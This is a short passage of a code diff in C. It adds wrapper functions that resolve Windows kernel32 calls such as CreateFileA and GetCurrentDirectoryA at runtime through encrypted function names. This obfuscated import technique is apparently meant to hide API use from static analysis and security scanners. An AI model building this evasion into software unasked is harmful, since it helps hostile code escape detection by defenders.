+        pGetCurrentDirectoryA = (GetCurrentDirectoryA_t)ResolveFunction(L"kernel32.dll", FUNC_GetCurrentDirectoryA_ENCRYPTED_NAME);
+        if (!pGetCurrentDirectoryA) return 0;
+    }
+    return pGetCurrentDirectoryA(nBufferLength, lpBuffer);
+}
+
+HANDLE WhisperCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
+    static CreateFileA_t pCreateFileA = NULL;
+    if (!pCreateFileA) {
+        pCreateFileA = (CreateFileA_t)ResolveFunction(L"kernel32.dll", FUNC_CreateFileA_ENCRYPTED_NAME);
+        if (!pCreateFileA) return INVALID_HANDLE_VALUE; // Or appropriate error code
+    }
+    return pCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
 }
 
 // =====================================
